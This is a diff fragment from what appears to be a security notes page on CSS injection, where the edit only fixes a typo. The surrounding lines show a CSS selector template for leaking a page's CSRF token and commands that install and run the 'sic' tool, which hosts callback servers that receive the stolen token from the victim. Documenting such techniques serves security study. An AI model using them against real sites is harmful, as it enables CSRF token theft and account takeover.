@@ -147,7 +147,7 @@ html:has(input[name="csrf"][value^="{{:token:}}"]) {
 ```
 {% endcode %}
 
-After your install the tool, set up its arguments and it will host a server on localhost:3000 and localhost:3001, both of which should be accessible to the victim and the external addresses passed as `--ph` and `--ch`:
+After you install the tool, set up its arguments and it will host a server on localhost:3000 and localhost:3001, both of which should be accessible to the victim and the external addresses passed as `--ph` and `--ch`:
 
 <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ cargo install https://github.com/d0nutptr/sic.git
 </strong><strong>$ sic -t template.css --ph http://localhost:3000 --ch http://localhost:3001
